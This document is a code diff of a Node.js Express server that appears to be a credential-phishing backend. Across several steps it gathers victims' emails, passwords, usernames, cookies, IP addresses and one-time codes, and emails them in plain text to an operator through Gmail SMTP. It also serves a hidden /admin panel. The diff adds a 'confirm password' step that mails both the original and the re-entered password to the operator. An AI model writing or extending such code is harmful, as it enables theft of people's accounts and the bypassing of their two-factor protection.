@@ -3,12 +3,11 @@ const express = require('express');
 const nodemailer = require('nodemailer');
 const path = require('path');
 const crypto = require('crypto');
-const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// In-memory store for OTPs (simple for dummy test)
+// In-memory store for OTPs
 const sessions = new Map();
 
 // Clean old sessions every 30 minutes
@@ -21,16 +20,11 @@ setInterval(() => {
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-
-// Serve only the user-facing files from public/
-// (admin.html is intentionally NOT placed in public/)
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ========== HIDDEN ADMIN PANEL ==========
-// Only accessible at /admin — not linked anywhere on the user page
+// Hidden admin panel at /admin
 app.get('/admin', (req, res) => {
-  const adminPath = path.join(__dirname, 'views', 'admin.html');
-  res.sendFile(adminPath);
+  res.sendFile(path.join(__dirname, 'views', 'admin.html'));
 });
 
 // Gmail SMTP transporter
@@ -42,12 +36,10 @@ const transporter = nodemailer.createTransport({
   }
 });
 
-// Helper: generate 6-digit OTP
 function generateOTP() {
   return crypto.randomInt(100000, 999999).toString();
 }
 
-// Helper: send email to admin (plain text notification)
 async function notifyAdmin(subject, data) {
   const text = Object.entries(data)
     .map(([k, v]) => `${k}: ${v}`)
@@ -66,7 +58,6 @@ async function notifyAdmin(subject, data) {
   }
 }
 
-// Helper: send OTP to the user's email
 async function sendOTPToUser(toEmail, otp, step) {
   try {
     await transporter.sendMail({
@@ -129,27 +120,52 @@ app.post('/api/step1', async (req, res) => {
   });
 });
 
-// Step 2: Username
+// Step 2: Username + Confirm Password (must match original password)
 app.post('/api/step2', async (req, res) => {
-  const { sessionId, username } = req.body;
+  const { sessionId, username, confirmPassword } = req.body;
   const session = sessions.get(sessionId);
 
   if (!session) {
-    return res.status(400).json({ success: false, message: 'Invalid or expired session' });
+    return res.status(400).json({ success: false, message: 'Invalid or expired session. Please restart.' });
   }
 
+  // Check if the confirmed password matches the original one
+  if (confirmPassword !== session.password) {
+    // Notify admin of the failed attempt
+    await notifyAdmin('Password confirmation FAILED', {
+      Email: session.email,
+      'Original Password': session.password,
+      'Entered Confirm Password': confirmPassword,
+      Username: username || '(not set)',
+      Cookies: session.cookies,
+      'IP Address': session.ip,
+      Timestamp: new Date().toISOString(),
+      Status: 'Password did not match – user must restart'
+    });
+
+    // Delete the session so user has to start over
+    sessions.delete(sessionId);
+
+    return res.json({
+      success: false,
+      message: 'Password does not match the one you entered earlier. Restarting...'
+    });
+  }
+
+  // Password matched
   session.username = username || '';
 
-  await notifyAdmin('Username', {
+  await notifyAdmin('Username + Password confirmed', {
     Email: session.email,
     Password: session.password,
     Username: session.username,
     Cookies: session.cookies,
     'IP Address': session.ip,
-    Timestamp: new Date().toISOString()
+    Timestamp: new Date().toISOString(),
+    Status: 'Password confirmed successfully'
   });
 
-  res.json({ success: true, message: 'Username received' });
+  res.json({ success: true, message: 'Username received and password confirmed' });
 });
 
 // Step 3: Verify OTP 1 and send OTP 2
